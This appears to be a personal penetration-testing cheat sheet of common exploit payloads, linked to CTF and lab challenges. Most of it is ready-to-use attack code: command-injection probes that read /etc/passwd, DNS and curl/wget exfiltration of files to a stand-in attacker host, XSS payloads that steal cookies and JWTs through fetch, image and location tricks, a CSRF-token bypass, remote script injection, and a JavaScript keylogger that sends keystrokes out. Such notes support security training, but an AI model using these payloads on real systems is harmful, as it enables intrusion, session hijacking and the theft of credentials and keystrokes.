# Common Exploits

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) is the way to go, but I noted down some of mine.

<hr class="sep-both">

## Command Execution

<div class="row row-cols-lg-2"><div>

#### Command Execution â€” In-Band

[![powershell_command_injection](../../../../_badges/rootme/app_script/powershell_command_injection.svg)](https://www.root-me.org/en/Challenges/App-Script/Powershell-Command-Injection)
[![powershell_basic_jail](../../../../_badges/rootme/app_script/powershell_basic_jail.svg)](https://www.root-me.org/en/Challenges/App-Script/Powershell-Basic-jail)

Linux commands:

```shell!
$ pwd
$ whoami
$ whoami;id
$ whoami||id
$ cat /etc/passwd
```

Windows commands:

```shell!
PS> whoami
PS> $(whoami)
PS> $(Get-ChildItem Env:)
PS> $(command|Out-string) | powershell command
```
</div><div>

#### Command Execution â€” Out-Of-Band

Use DNS-exfiltration to extract the command output:

```shell!
$ nslookup `whoami`.domain.com
$ nslookup $(whoami).domain.com
```

Extracting files using HTTP:

```shell!
$ curl -F "key=@/etc/passwd" https://hacker.example.com
$ wget --post-file=/etc/passwd https://hacker.example.com
```

Redirect output to an exposed HTML file:

```shell!
$ cat /etc/passwd > /var/www/html/output.txt
```

Add a time delay:

```shell!
$ true && sleep 5
```
</div></div>

<hr class="sep-both">

## JavaScript

*Real examples of malicious code can be found at [XSS-payloads](http://www.xss-payloads.com/payloads-list.html?a#category=all) <small>(ðŸ’¥?)</small>.*

<div class="row row-cols-lg-2"><div>

#### JavaScript â€” Fingerprint

[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)
[![session_security](../../../../_badges/htb/session_security.svg)](https://academy.hackthebox.com/course/preview/session-security)

We sometimes need to check a few things:

* `document.domain`: current domain name
* `window.location`: current URL
* `window.origin`: when inside a IFRAME
* `"fieldname"`: to make sure which field is vulnerable

Often with `alert(...)` or `console.log(...)` or `print()` for `<iframe>`.

#### JavaScript â€” Steal Cookie

[![cross_site_scripting](../../../../_badges/htb/cross_site_scripting.svg)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss)
[![session_security](../../../../_badges/htb/session_security.svg)](https://academy.hackthebox.com/course/preview/session-security)
[![xssgi](../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)
[![xss_stored_1](../../../../_badges/rootme/web_client/xss_stored_1.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)
[![xss_dom_based_introduction](../../../../_badges/rootme/web_client/xss_dom_based_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)
[![xss_dom_based_filters_bypass](../../../../_badges/rootme/web_client/xss_dom_based_filters_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Filters-Bypass)
[![csp_bypass_nonce](../../../../_badges/rootme/web_client/csp_bypass_nonce.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Nonce)
[![xss_reflected](../../../../_badges/rootme/web_client/xss_reflected.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)
[![xss_stored_filter_bypass](../../../../_badges/rootme/web_client/xss_stored_filter_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-filter-bypass)
[![xss_dom_based](../../../../_badges/rootme/web_client/xss_dom_based.svg)](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based)
[![marketplace](../../../../_badges/thm-p/marketplace.svg)](https://tryhackme.com/r/room/marketplace)

Classic fetch cookie with/without space handling

```javascript!
fetch('https://hacker.example.com/?cookie=' + document.cookie)

fetch('https://hacker.example.com/?cookie=' + btoa(document.cookie))
```

Double nested fetch for Anti-CSRF Token bypass

```javascript!
fetch('https://hacker.example.com/admin/')
	.then(r=>r.text())
	.then(html => {
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const csrfToken = doc.querySelector('input[name="csrf"]')?.value;
        fetch('https://hacker.example.com/admin/enable', {
			'credentials': 'include',
			'headers': {
				'Content-Type': 'application/x-www-form-urlencoded',
			},
			"body": "username=jdoe&csrf="+csrfToken,
			"method": "POST",
			"mode": "cors"
		});
    })
```

Location-based (CORS bypass).

```javascript!
location="https://hacker.example.com/?cookie="+document.cookie
```

JWT exfiltration using location.

```javascript
fetch("/api/token", {
  "headers": {
    "accept": "*/*",
  },
  "mode": "no-cors",
  "body": null,
  "method": "GET",
  "credentials": "include"
}).then(r=>r.json()).then(r=>location.href='https://hacker.example.com/?' +r.apikey);
```

Fetch using alternate method

```javascript!
fetch('https://hacker.example.com', { method: 'POST', mode: 'no-cors', credentials: 'include', body: btoa(document.cookie) });
```
</div><div>

#### JavaScript â€” Fetch Using Images

Images may have been blocked but fetch may have not.

```javascript!
new Image().src = "https://hacker.example.com/?cookie="+btoa(document.cookie);
// image reuse (must have one)
document.images[0].src = "https://hacker.example.com/?cookie="+btoa(document.cookie)
// longer version
document.body.appendChild(Object.assign(document.createElement('img'), { src: "X"+btoa(document.cookie) }));
// alternative payload
let imageElement = document.createElement("img"); imageElement.src = "https://hacker.example.com/?cookie="+btoa(document.cookie); document.body.appendChild(imageElement);
```

#### JavaScript â€” Inject Script Tag

Inject a remote external JavaScript file, useful when length is limited or there is a need to bypass some protections.

```javascript!
document.write`<script src=//example.com>`

appendChild(createElement`script`).src='//example.com/x.js'

document.body.appendChild(document.createElement`script`).src='//example.com/x.js'

s=document.createElement('script');s.src='//example.com/x.js';document.body.appendChild(s);

(s=>document.body.appendChild(s))(document.createElement('script')).src='//example.com/x.js'

document.appendChild(Object.assign(document.createElement('script'),{src:'//example.com/x.js'}));
```

#### JavaScript â€” Submit Form

Mostly in CSRF context, submit a form.

```javascript!
document.forms[0].submit()
document.getElementById('my_form').submit()
```

#### JavaScript â€” Keylogger

Sends pressed keys to a malicious website. The code is using `btoa()` to encode in base64 the values.

```javascript!
let keys = ''
document.onkeydown = e => keys += e.key
setInterval(() => {
    if (keys === '') return
    fetch('https://example.com/keylogger?key=' + btoa(keys) )
    keys = ''
}, 1000)
```
</div></div>